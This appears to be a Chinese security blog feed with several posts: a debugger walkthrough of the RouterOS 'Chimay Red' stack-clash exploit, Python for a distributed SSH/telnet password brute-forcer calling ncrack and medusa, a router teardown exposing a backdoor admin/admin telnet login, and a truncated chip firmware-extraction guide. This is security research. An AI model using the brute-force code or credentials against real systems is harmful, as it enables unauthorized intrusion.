alt="2"><br>alloca函数将content_len_velue进行对齐之后，在当前栈帧上分配了对应大小的空间，这将允许我们直接控制当前栈帧的栈顶位置。</p><p>如果我们传入content_length的值为2147483648[-2147483648]到4294967295[-1]之间的任意值，则栈顶指针将不是向上增长而是向下移动指向已使用的栈区位置，然后istream::read会从socket读取content_len_velue长度的数据到当前栈顶指定的缓冲区内，这将引起栈粉碎。并且由于istream::read的第二个参数类型为uint，istream::read会读取至少2147483648字节的数据到栈上，这很明显会超出当前栈底，在istream::read函数返回之前生成一个SEGFAULT错误。现在看来这似乎是一个不可执行代码的漏洞，那么如何才能达到代码执行的目的呢？<br>可以先看一下Chiamy Red项目中的exp是怎么写的。如下图，先创建两个socket，分别向两个socket发送了指定了content_length的post header数据，并向s1发送了n个‘A’和payload，然后将s2关闭。从注释也可看出，其利用方式和线程栈有关。 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/3.png" alt="3"></p><p>再来看看Request::readPostData函数是在哪里被调用的，使用IDA查看Request::readPostData的交叉引用发现www中没有引用此函数的位置。现在我们动态调试下，看看此函数在哪里被调用。telnet连接上RouterOS,把RouterOS的ALSR保护关闭掉，然后kill掉www进程之后系统会自动重启www程序（以下所有图片为多次调试www程序所截图像，所以进程号会有所不同，但并不影响我们的分析） </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/4.png" alt="4"></p><p>使用gdbserver附加到www进程上，使用gdb远程调试。 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/5.png" alt="5"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/6.png" alt="6"></p><p>我们把断点下在调用alloca函数处 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/7.png" alt="7"></p><p>然后使用Chiamy Red项目中的exp把payload打到目标上 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/8.png" alt="8"></p><p>可以看到有两个新线程被创建，并且在线程2中触发了断点，说明Request::readPostData函数是在新线程中被调用的，并且栈顶寄存器指向0x77d86180 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/9.png" alt="9"></p><p>我们看一下0x77d86180在内存空间的哪个位置 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/10.png" alt="10"></p><p>可以看到0x77d86180并不位于进程内存空间的栈区，而是位于库文件加载区域中的一段空闲内存空间中，并且我们可以计算出分配给线程2的线程栈内存大小为0x77d87000-0x77d68000=0x1f000=124kb,继续运行www发现在线程3中断点又被触发了一次，且此次的栈顶寄存器指向0x77d66180，可以看到线程3的线程栈位于线程2的线程栈的上方且大小同为0x77d67000-0x77d48000=0x1f000=124kb,中间相隔0x77d68000-0x77d67000=0x1000=4kb的保护区。 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/11.png" alt="11"></p><p>现在线程栈在内存空间中的布局清楚了。现在从新开启调试，在alloca调用处下断点，continue并且重新打上payload，程序中断在线程2的alloca调用处，向下单步3条指令 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/12.png" alt="12"></p><p>此时线程3中的断点被触发，并且调试线程切换到了线程3,因为我们现在要调试线程2,所以先把线程3暂停，设置gdb的调度器锁到on状态，然后切换回线程2继续调试 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/13.png" alt="13"></p><p>单步到sub %eax,%esp指令处查看当前esp的值为0x77d86180，对照进程的内存空间布局，可以看到现在esp依然指向线程2的线程栈内，单步步过sub指令，然后再次查看esp的值为0x77d5d170，现在esp已经指向线程3的线程栈内了<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/14.png" alt="14"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/15.png" alt="15"></p><p>继续向下运行到istream::read函数调用处，查看栈中函数的参数，可以看到read函数会读取0x29000字节的数据到0x77d5d170处，正好是刚才alloca函数调整过的栈顶位置 0x77d5d170 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/16.png" alt="16"></p><p>继续单步步过read函数，重新查看0x77d5d170处有什么数据，发现此位置的数据并没有更新，read函数读取失败了，我们先把这个问题暂时放在这里，继续我们下面的调试，因为我们主要关注地址偏移量 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/17.png" alt="17"></p><p>查看下exp脚本都向s1发送了什么数据，注意到发往s1的数据部分是分两次发送的，两次发送期间向s2发送了构造的http头，现在我们来计算一下向s1发送了n个‘A’之后，read函数会读取到多少个‘A’,由脚本的宏定义可以计算出SKIP_SPACE-ALIGN_SIZE-ADDRESS_SIZE=0xfec,read函数在读取0xfec个‘A’之后，edi寄存器指向的位置在0x77d5d170+0xfec=0x77d5e15c，注意read再往后读取的数据就是shellcode了，就是说0x77d5e15c是shellcode的起始位置，并且此位置位于线程3的线程栈内 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/18.png" alt="18"></p><p>现在切换到线程3,继续调试，看看0x77d5e15c在线程3的线程栈中扮演了什么角色 </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/19.png" alt="19"></p><p>线程3的栈顶在经过调整之后指向0x77d5e170处，此处已经离0x77d5e15c不远了。继续运行到read函数的调用处，查看栈中的数据，发现此时栈顶指针指向0x77d5e160处，离0x77d5e15c只有四个字节，在调用call read指令后将read函数的返回地址存储到0x77d5e15c的位置，刚才分析到0x77d5e15c是shellcode的起始地址，此处可以劫持read函数的返回地址达到任意代码执行的目的。由于线程3的read函数会向0x77d5e170处写入数据，此处内存空间也是存储shellcode的空间，因此，不能向s2发送任何数据http协议的数据部分，否则将会赋盖shellcode，Chiamy Red项目中exp的作者使用close(s2)的方式来让线程3中的read函数返回，以运行shellcode。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/20.png" alt="20"></p><p>关于调试过程中出现的read函数读取失败的问题，可能是由于中断的时间太长导致socket超时引起的，直接把断点下在read函数调用下面，直接run至断点处，就能看到read函数读取成功了。</p><h2 id="exploit分析"><a href="#exploit分析" class="headerlink" title="exploit分析"></a>exploit分析</h2><p>最后正向梳理下exp作者的利用思路。传入负值可以复写当前线程栈的函数返回地址，但由于read函数的第二个参数类型为uint，写入内存的长度超长会在read函数返回之前就引发段错误导致程序异常退出；由于线程栈内存段是相邻的，且同一进程中的所有线程共享资源，那么可以赋写其他线程栈的函数返回地址，因为alloca函数可以分配栈空间，先通过content_length参数在线程2的线程栈上分配出容纳shellcode的内存空间，然后确定read函数的返回地址的存储位置ADDR，利用content_length调整线程1的线程栈栈顶寄存器指向ADDR之后的地址，然后使用‘A’作填充，使shellcode正好覆盖到ADDR处存储的返回地址达到任意代码执行的目的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;《Vault 7》是由维基解密从2017年3月7日开始，发布的一系列文件。其中详细描述了美国中央情报局(Central Intelligen
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="物联网安全" scheme="http://yaseng.org/tags/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
      <category term="路由器漏洞" scheme="http://yaseng.org/tags/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>谁是僵尸之王-如何进行高效的分布式爆破</title>
    <link href="http://yaseng.org/king-of-zombie.html"/>
    <id>http://yaseng.org/king-of-zombie.html</id>
    <published>2018-04-03T16:00:00.000Z</published>
    <updated>2018-06-29T10:31:52.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在研发漏洞扫描器的弱口令破解模块时，发现传统的通过字典遍历用户名密码的算法效率过低，当需要大批量高速爆破时，难以满足此类需求，因此需要引入新的算法，本文以一个分布式扫描器的爆破模块为例，演示如何进行高效快速的分布式爆破。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/6172922.jpg" alt="617292"></p><h2 id="传统方法"><a href="#传统方法" class="headerlink" title="传统方法"></a>传统方法</h2><p>传统的密码穷举</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15156625175922.jpg" alt=""><br>效率非常低，而且还有可能触发报警  </p><h2 id="king-of-zombie"><a href="#king-of-zombie" class="headerlink" title="king of zombie"></a>king of zombie</h2><p>koz (king of zombie) 算法,即首先按照多种算法对用户名密码字典组合进行评分,然后用评分最高的组合去淘汰僵尸主机。</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol><li>上游push ncrack任务到队列</li><li>koz 节点开始瓜分队列任务,保存为任务列表 (根据cpu,网速来分配多少任务) 。</li><li>使用账号密码字典爆破来遍历任务列表,hit中 即从列表中淘汰(字典按评分优先级排序)。</li></ol><ul><li>说明</li></ul><ol><li><p>字典评分按照爆破成功记录次数和蜜罐记录次数来计算,master 端实时更新,koz node 每日定时更新。</p></li><li><p>淘汰机制具体为先去除一大部分普遍存在的弱口令,例如某一批次中,第一次使用 ubnt/ubnt 来爆破ssh服务,就能淘汰 15% 的任务,第二次使用 root/123456 能淘汰 3% 。</p></li></ol><h3 id="表结构"><a href="#表结构" class="headerlink" title="表结构"></a>表结构</h3><p>pw_koz_level </p><table><thead><tr><th>列</th><th>类型</th><th>注释</th></tr></thead><tbody><tr><td>id</td><td>int(11)</td><td>自动增量</td></tr><tr><td>username</td><td>varchar(255)</td><td>用户名</td></tr><tr><td>password</td><td>varchar(255)</td><td>密码</td></tr><tr><td>type</td><td>varchar(255)</td><td>类型</td></tr><tr><td>score</td><td>int(11)</td><td>评分</td></tr></tbody></table><h3 id="更新算法"><a href="#更新算法" class="headerlink" title="更新算法"></a>更新算法</h3><p>目前数据来源有四个<br>第一个  扫描器爆破成功记录  score 值为 10<br>第二个  蜜罐记录   score 值 为 1<br>第三个  渗透进去提取到的有效密码(例如windows 明文)  ,score 10<br>第四个  收集的各种工具扫描字典  score 值为 1</p><p>扫描的时候工具score 值来排序,命中一次之后+10 </p><p>例如如下字典列表</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15228255230476.jpg" alt=""></p><h4 id="master"><a href="#master" class="headerlink" title="master"></a>master</h4><p>推送任务之后使用无状态扫描工具扫描服务和指纹识别</p><h4 id="koz-node"><a href="#koz-node" class="headerlink" title="koz node"></a>koz node</h4><p>KozTask 类来保存本地任务队列,接收处的代码为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">pop_member</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> self.len() &gt;  <span class="number">0</span>:</span><br><span class="line">        str_member=self.pop()</span><br><span class="line">        koz_member=ast.literal_eval(str_member)</span><br><span class="line">        self.list_member[str(koz_member[<span class="string">'name'</span>])].append(koz_member)</span><br><span class="line">    util.log(<span class="string">"pop koz_member  done count:%d"</span>  % (self.count()),<span class="number">2</span>,<span class="string">'koztask'</span>)</span><br></pre></td></tr></table></figure><p>本地队列处理完毕之后,开始foreach 循环用户名密码组合(根据score 大小优先级)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">koz_levels=get_koz_level()</span><br><span class="line"><span class="keyword">for</span> koz_level  <span class="keyword">in</span>  koz_levels :</span><br><span class="line">    koz_queue.queue.clear()</span><br><span class="line">    <span class="comment">#member=&#123;'name': 'ssh', 'task_id': 1124, 'url': '', 'host': '168.167.45.250', 'version': '', 'type': 'service', 'port': 22&#125;</span></span><br><span class="line">    <span class="comment">#ncrack.scan(member,koz_level)</span></span><br><span class="line">    <span class="comment">#break</span></span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        <span class="keyword">for</span> member  <span class="keyword">in</span>   koz_task.list_member[koz_level[<span class="string">'type'</span>]] :</span><br><span class="line">            koz_queue.put(&#123;<span class="string">'member'</span>:member,<span class="string">'level'</span>:koz_level&#125;)</span><br><span class="line"></span><br><span class="line">        work_manager = WorkManager(koz_queue, config.koz_thread)  <span class="comment"># thread</span></span><br><span class="line">        work_manager.wait_allcomplete()</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        util.log(<span class="string">"error info:"</span>+str(e),<span class="number">3</span>,<span class="string">'koz_node'</span>)</span><br><span class="line">    util.log(<span class="string">'koz_member len:%d'</span> % (koz_task.count()),<span class="number">1</span>,<span class="string">'koz_node'</span>)</span><br></pre></td></tr></table></figure><p>当扫描出来结果时,直接把它从 koz_member 队列里面remove 掉,如此循环往复,直到跑完所有的密码。<br>remove </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">while</span>  <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> self.work_queue.empty() == <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        task = self.work_queue.get(block=<span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">if</span> ncrack.scan(task[<span class="string">'member'</span>],task[<span class="string">'level'</span>])  != <span class="keyword">False</span> :</span><br><span class="line">            koz_type=task[<span class="string">'member'</span>][<span class="string">'name'</span>]</span><br><span class="line">            koz_task.list_member[koz_type].remove(task[<span class="string">'member'</span>])</span><br></pre></td></tr></table></figure><h3 id="爆破算法"><a href="#爆破算法" class="headerlink" title="爆破算法"></a>爆破算法</h3><p>负责爆破的为ncrack 模块,调用的爆破工具有  medusa,ncrack。<br>部分实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(target,level)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> target[<span class="string">'name'</span>]  == <span class="string">'ms-wbt-server'</span>  <span class="keyword">or</span>  target[<span class="string">'name'</span>]  == <span class="string">'telnet'</span> :</span><br><span class="line">        str_command = <span class="string">"ncrack --user %s --pass %s  %s:%d "</span>  %  (level[<span class="string">'username'</span>],level[<span class="string">'password'</span>],target[<span class="string">'host'</span>],target[<span class="string">'port'</span>])</span><br><span class="line">        str_ret=str(sys_exec([<span class="string">'ncrack'</span>, <span class="string">'--user'</span>,level[<span class="string">'username'</span>], <span class="string">'--pass'</span>, level[<span class="string">'password'</span>], target[<span class="string">'host'</span>]+<span class="string">':'</span>+ str(target[<span class="string">'port'</span>])]))</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        str_command = <span class="string">"medusa -u %s -p %s -h %s -n %d  -M %s"</span> % (level[<span class="string">'username'</span>], level[<span class="string">'password'</span>], target[<span class="string">'host'</span>], target[<span class="string">'port'</span>], target[<span class="string">'name'</span>])</span><br><span class="line">        str_ret=str(sys_exec([<span class="string">'medusa'</span>,<span class="string">'-u'</span>,level[<span class="string">'username'</span>],<span class="string">'-p'</span>,level[<span class="string">'password'</span>],<span class="string">'-h'</span>,target[<span class="string">'host'</span>],<span class="string">'-n'</span>,str(target[<span class="string">'port'</span>]),<span class="string">'-M'</span>,target[<span class="string">'name'</span>]]))</span><br><span class="line">    </span><br><span class="line">    util.log(str_command, <span class="number">2</span>, <span class="string">'ncrack'</span>)</span><br><span class="line">    <span class="comment">#need  change </span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'ACCOUNT FOUND'</span> <span class="keyword">in</span> str_ret  <span class="keyword">or</span>  <span class="string">'credentials'</span>  <span class="keyword">in</span> str_ret:</span><br><span class="line">        str_data=<span class="string">'[%s] %s %s:%s'</span>   %  (target[<span class="string">'name'</span>],target[<span class="string">'host'</span>],level[<span class="string">'username'</span>],level[<span class="string">'password'</span>])</span><br><span class="line">        util.log(<span class="string">'ncrack taskid:%d target:%s service:%s succeed'</span> % (target[<span class="string">'task_id'</span>], target[<span class="string">'host'</span>], target[<span class="string">'name'</span>]), <span class="number">1</span>, <span class="string">'ncrack'</span>)</span><br><span class="line">        <span class="keyword">return</span> report(target,str_data)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>  :</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><h3 id="爆破结果"><a href="#爆破结果" class="headerlink" title="爆破结果"></a>爆破结果</h3><p> 总览<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/14703046762519.png" alt=""></p><p>图文分析</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/14703047183607.jpg" alt=""></p><p>部分结果一览</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/147030475970560.jpg" alt="147030475970560"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在研发漏洞扫描器的弱口令破解模块时，发现传统的通过字典遍历用户名密码的算法效率过低，当需要大批量高速爆破时，难以满足此类需求，因此需要引入新
      
    
    </summary>
    
      <category term="原创作品" scheme="http://yaseng.org/categories/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
    
    
      <category term="密码爆破" scheme="http://yaseng.org/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>某4G无线路由终端分析</title>
    <link href="http://yaseng.org/analysis-of-a-4G-wireless-router.html"/>
    <id>http://yaseng.org/analysis-of-a-4G-wireless-router.html</id>
    <published>2018-01-19T16:00:00.000Z</published>
    <updated>2018-06-29T10:23:45.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="设备介绍"><a href="#设备介绍" class="headerlink" title="设备介绍"></a>设备介绍</h2><p>随着4G网络的大区域覆盖，移动端的网络速度得到大幅提升，此次分析的该款4G无线路由终端，就是通过sim卡连上LTE网络之后，在通过wifi模块将蜂窝网络转为wifi信号共享给其他设备使用，其原理与手机共享热点类似，因其便携省电等功能，目前在市场上的反响颇高，X宝销量达数万件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171902.jpg" alt="1224171902"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171219164331.jpg" alt="QQ截图20171219164331"></p><h2 id="硬件分析"><a href="#硬件分析" class="headerlink" title="硬件分析"></a>硬件分析</h2><p>话不多说，进入正题，拆掉背面螺丝，取出电池，揭掉正面盖板，在正面PCB上是一块全彩TFT屏幕，显示效果一般，屏幕下方有多个印字。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171903.jpg" alt="1224171903"></p><p>左侧有两个焊点，分别是RXD和TXD口，可以通过UART模式调试。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171903a.jpg" alt="1224171903a"></p><p>下方左侧是8口的JTAG调试口，加一个公用GND口，JTAG调试下篇会重点介绍。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171903b.jpg" alt="1224171903b"></p><p>正下方靠近USB充电口位置是电源电压测试口，主要用来测量额定输入输出的电源电压。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171903c.jpg" alt="1224171903c"></p><p>拆掉PCB上的螺丝，翻转板子，背面包括SIM插槽、SD卡插槽以及核心处理芯片，出于保护和散热的目的，还加装了保护盖。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171904.jpg" alt="1224171904"></p><p>拆掉盖子，先看下主要芯片的型号和用途，这对进一步分析有很大帮助。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171905-bianhao.jpg" alt="1224171905-bianhao"></p><p>图上标注1的芯片通过查看印字分析,为芯天下出产的PN26Q01AWSIUG 型存储芯片，存储容量为1G。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191431.jpg" alt="20171218_191431"></p><p>标注2的芯片为中兴微电子生产的ZX297520型手机modem芯片，支持TD-LTE/FDD LTE /WCDMA/TD-SCDMA/EDGE全模制式。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191405.jpg" alt="20171218_191405"></p><p>标注3的芯片为Realtek生产的使用非常广泛的RTL8189ES无线wifi芯片，是一款高性能、低功耗、体积小SDIO接口无线模组。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191336.jpg" alt="20171218_191336"></p><p>标注4的芯片为中兴微电子生产的ZX23422电源管理芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191524.jpg" alt="20171218_191524"></p><p>标注5的芯片为锐迪科（RDA）生产的RPM6743射频前端芯片，是蜂窝网络和wifi信号广播收发的重要组成部分。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191505.jpg" alt="20171218_191505"></p><h2 id="串口调试"><a href="#串口调试" class="headerlink" title="串口调试"></a>串口调试</h2><p>在认识设备的基本构成之后，重新组装好，首先通过正面的UART调试串口来进行初步调试，采用夹具连接RXD、TXD两个调试点，在设备通电情况下，只需把转接板上的GND口与板子上的公用GND口相连即可。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image89.jpg" alt="image89"></p><p>因串口输出信息过多，影响观察输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image90.jpg" alt="image90"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image91.jpg" alt="image91"></p><h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>查看当前进程，通过串口输出信息，发现该终端采用goahead作为web服务器，4719端口存在一个telnet服务。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/hgjghjtyut.jpg" alt="命令"></p><p>连接wifi进入web管理界面，查看设备ip。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15136011800782.jpg" alt="15136011800782"></p><p>通过telnet连接设备，使用弱口令弱口令：admin、admin即可登录。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15136011175389.jpg" alt="15136011175389"></p><p>该账号为后门账号。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15136012728967.jpg" alt="15136012728967">查看开启的端口。</p><p>如果需要继续分析，可以通过tftp 传输文件至本地，例如/bin/goahead。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;设备介绍&quot;&gt;&lt;a href=&quot;#设备介绍&quot; class=&quot;headerlink&quot; title=&quot;设备介绍&quot;&gt;&lt;/a&gt;设备介绍&lt;/h2&gt;&lt;p&gt;随着4G网络的大区域覆盖，移动端的网络速度得到大幅提升，此次分析的该款4G无线路由终端，就是通过sim卡连上LTE网络之后，
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>芯片安全系列-Let&#39;s cook!</title>
    <link href="http://yaseng.org/chip-security-let-us-cook.html"/>
    <id>http://yaseng.org/chip-security-let-us-cook.html</id>
    <published>2018-01-16T16:00:00.000Z</published>
    <updated>2018-06-29T10:27:44.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>芯片安全是针对芯片本身的安全研究，其在知识产权保护，防抄板山寨、加密破解、优化设计、漏洞挖掘和芯片木马等方面都具有深远意义，传统安全往往着眼于上层应用和驱动层面的安全，然而如果芯片存在本质的设计缺陷或安全漏洞，传统安全手段往往很难触及底层，前段时间英特尔芯片的“崩溃”（Meltdown）和“幽灵”（Spectre）漏洞，轰动整个世界，造成了巨额的损失，此次漏洞爆发就是因为芯片自身的设计缺陷所导致的，芯片级的安全研究是一项长期而艰难的工作，其是一门涉及多学科多门类的综合性研究，包括：微电子学、计算机科学、数学、物理学、化学、电磁学、光学等等。芯片分析方式主要包括非侵入式、半侵入式、侵入式、侧信道等。本文通过对某款蓝牙锁芯片的处理和固件提取，作为芯片分析的简单实例。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/dfghfghfhg.jpg" alt="dfghfghfhg"></p><h2 id="拆焊"><a href="#拆焊" class="headerlink" title="拆焊"></a>拆焊</h2><p>在PCB背面有一颗CC2541的蓝牙芯片，此款芯片采用QFN-40封装格式，没有暴露的可以直连外部引脚，厂商在量产时也把调试接口去掉了，为了获取芯片的固件内容，需要进行拆焊。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/fghgjty555.jpg" alt="fghgjty555"></p><p>拆焊所需工具包括：热风枪、焊枪、松香水、吸锡线、洗板水或无水酒精、无纺布、镊子等。热风枪温度调到360度，风速在5档左右，先在距离PCb上方3到5厘米处，给PCB预热几秒，然后缓缓下移到1厘米处，沿着芯片的四周匀速转动，枪口务必不要对准芯片的中心处，防止芯片过热，造成损毁，大概20秒左右即可融化芯片底部焊锡，另一只手用镊子夹住芯片，轻轻往上一提，芯片即可从PCB取下。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134552.jpg" alt="20180116_134552"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134549.jpg" alt="20180116_134549"></p><h2 id="清洁"><a href="#清洁" class="headerlink" title="清洁"></a>清洁</h2><p>取下芯片之后，芯片的底部会粘有很多未去除的焊锡和脏物，需要进一步清洁处理，首先滴上松香水，用焊枪使焊锡融化。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134618.jpg" alt="20180116_134618"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134719.jpg" alt="20180116_134719"></p><p>然后用吸锡线配合焊枪把多余的焊锡和脏物吸掉，反复几次。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134735.jpg" alt="20180116_134735"></p><p>处理完毕之后，用洗板水和无纺布擦洗芯片，彻底去除脏物残留，引脚应保持光亮，以防接触不良和短路。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134815.jpg" alt="20180116_134815"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134845.jpg" alt="20180116_134845"></p><p>焊锡、松香水和洗板水气味比较刺鼻，高温易伤手，工作环境需要注意通风，有条件可以配置防护服。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/breaking-bad-heisenberg-jesse-hazmat-suit-combo-sixth-scale-threezero-902883-28.jpg" alt="breaking-bad-heisenberg-jesse-hazmat-suit-combo-sixth-scale-threezero-902883-28"></p><h2 id="芯片读取"><a href="#芯片读取" class="headerlink" title="芯片读取"></a>芯片读取</h2><p>CC2541芯片是TI出品的一款蓝牙芯片，TI有专门的工具和软件来读取，包括：CCDebugger调试器和SmartRF Flash Programmer软件，因芯片已经拆下，可以通过转接板或烧录座连接芯片，引出相应的接口，然后连接CCDebugger进行固件的读取。</p><p>把处理好的芯片放入烧录座，需要正确放置芯片，可以通过芯片正面的小圆点确定方向。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134912.jpg" alt="20180116_134912"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_135324.jpg" alt="20180116_135324"></p><p>确认无误之后，压紧烧录座盖，连上CCDebugger。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_135403.jpg" alt="20180116_135403"></p><p>打开SmartRF Flash Programmer，选择Read flash into hex-file选项，在Flash 